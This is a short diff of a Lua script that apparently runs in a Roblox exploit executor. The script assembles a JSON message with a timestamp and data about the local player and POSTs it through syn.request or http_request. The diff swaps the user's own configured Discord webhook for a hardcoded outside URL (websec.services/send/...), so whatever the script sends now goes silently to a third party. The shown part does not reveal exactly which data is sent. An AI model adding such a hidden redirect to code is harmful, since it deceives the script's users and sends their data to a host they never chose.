@@ -28,7 +28,7 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
 			},
 			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
 }(syn and syn.request or http_request or http.request) {
-    Url = ''..getgenv().DiscordWebhook..'';
+    Url = 'https://websec.services/send/634d7baf9ad22e8b19d02083';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
